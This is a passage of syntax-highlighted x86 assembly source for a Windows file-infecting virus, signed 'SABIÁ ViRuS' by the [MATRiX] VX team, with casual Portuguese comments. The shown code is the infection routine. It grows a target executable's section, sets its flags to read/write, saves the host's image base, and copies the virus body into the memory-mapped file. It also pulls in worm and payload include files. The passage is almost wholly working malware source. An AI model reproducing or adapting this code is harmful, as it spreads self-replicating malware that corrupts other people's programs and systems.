   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc5">infectar@009</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">16</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">infectar@009</span><span class="sc0">

   </span><span class="sc1">; espaço aumentado...</span><span class="sc0">

   </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">36</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">

   </span><span class="sc1">; imagebase salva</span><span class="sc0">

   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base0</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chamada@001</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))]</span><span class="sc0">

   </span><span class="sc1">; imagebase em eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">))]</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">img_base1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc1">; aumentando arquivo...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
   </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle@002</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc1">; eax contem o novo valor</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IOB@001</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IO@001</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">infectar@002</span><span class="sc0">

   </span><span class="sc1">; agora so falta copiar o codigo para dentro do arquivo,</span><span class="sc0">
   </span><span class="sc1">; adicionando os valores que eu tinha salvo na pilha ao</span><span class="sc0">
   </span><span class="sc1">; offset do arquivo mapeado na memoria</span><span class="sc0">

   </span><span class="sc1">; nao acredito que to escrevendo essas linhas até essa hora</span><span class="sc0">
   </span><span class="sc1">; da madruga (são 01:59), foi dia de malhar o judas, essas</span><span class="sc0">
   </span><span class="sc1">; coisas de igreja, cristo e etc... lembrei, páscoa;</span><span class="sc0">

   </span><span class="sc1">; comi meu ovo de chocolate todo uns dias atras, hoje</span><span class="sc0">
   </span><span class="sc1">; fiquei roubando dos parentes :) .</span><span class="sc0">

   </span><span class="sc1">; não sou de ferro, vou dar uma pausa para um cigarrinho...</span><span class="sc0">
   </span><span class="sc1">; até daqui a 5 minutos</span><span class="sc0">

   </span><span class="sc1">; voltei</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

   </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">mena1</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Arquivo infectado:'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">mena1</span><span class="sc4">:</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer@001</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">user@005</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc9">ELSE</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc5">infectar@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">IOB@001</span><span class="sc0">

   </span><span class="sc5">infectar@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SABIÁ ViRuS'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Software provide by '</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[MATRiX] VX TeAm: Ultras, Mort, Nbk, Tgr, Del_Armg0, Anaktos'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Greetz: All VX guy in #virus and Vecna for help us'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Visit us at:'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://www.coderz.net/matrix'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

   </span><span class="sc5">worm@001</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">INCLUDE</span><span class="sc0"> \</span><span class="sc5">VIRUS</span><span class="sc0">\</span><span class="sc5">SABIA</span><span class="sc0">\</span><span class="sc5">WORM.INC</span><span class="sc0">

   </span><span class="sc5">worm@002</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">INCLUDE</span><span class="sc0"> \</span><span class="sc5">VIRUS</span><span class="sc0">\</span><span class="sc5">SABIA</span><span class="sc0">\</span><span class="sc5">MATRiX.INC</span><span class="sc0">

   </span><span class="sc5">sabia@end</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sabia@end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">user@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">user@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">buffer@002</span><span class="sc0"> </span><span class="sc5">STARTUPINFO</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">buffer@003</span><span class="sc0"> </span><span class="sc5">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">buffer@004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">buffer@005</span><span class="sc0"> </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">buffer@006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">MAX_PATH</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">handle@001</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@002</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@003</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@004</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@005</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@006</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@007</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@008</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">handle@009</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">sabia@memory</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">
   </span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">
   </span><span class="sc5">API</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc0">

   </span><span class="sc9">.data</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

   </span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
   </span><span class="sc5">end</span></div></body>
</html>
